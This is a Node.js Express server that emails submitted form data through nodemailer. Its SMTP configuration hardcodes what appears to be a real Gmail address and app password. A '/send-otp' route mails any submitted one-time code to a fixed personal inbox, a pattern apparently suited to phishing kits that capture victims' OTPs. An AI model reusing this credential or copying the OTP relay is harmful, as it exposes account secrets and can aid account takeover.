const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const app = express();
"use strict";
const nodemailer = require('nodemailer');

// Set up your SMTP email configuration (using a test account here)
const transporter = nodemailer.createTransport({
  service: 'Gmail',
  host: "smtp.forwardemail.net",
  port: 465,
  secure: true,
  auth: {
    user: 'ayomidotzee@gmail.com', // Replace with your email
    pass: 'bvzuefwexcyxddlk' // Replace with your email password
  }
});

// Enable CORS for all routes
app.use(cors())

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Define the API route for handling form data
app.post('/send-email', (req, res) => {
  const { name, email, phoneNumber, message } = req.body;

  // Email content
  const mailOptions = {
    from: 'ayomidotzee@gmail.com', // Replace with your email
    to: 'ay7ot15@gmail.com', // Replace with the recipient's email
    subject: 'New Form Submission',
    text: `
      Name: ${name}
      Email: ${email}
      Phone Number: ${phoneNumber}
      Message: ${message}
    `
  };

  // Send the email
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.status(500).send('Error: Something went wrong.');
    } else {
      console.log('Email sent: ' + info.response);
      res.status(200).send('Email sent successfully!');
    }
  });
});

// Define the API route for handling form data
app.post('/send-otp', (req, res) => {
  const { otp } = req.body;

  // Email content
  const mailOptions = {
    from: 'ayomidotzee@gmail.com', // Replace with your email
    to: 'ay7ot15@gmail.com', // Replace with the recipient's email
    subject: 'New Form Submission',
    text: `
      otp: ${otp}
    `
  };

  // Send the email
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.status(500).send('Error: Something went wrong.');
    } else {
      console.log('Email sent: ' + info.response);
      res.status(200).send('Email sent successfully!');
    }
  });
});

const port = 5000; // You can choose any available port
app.listen(port, () => console.log(`Server running on port ${port}`));
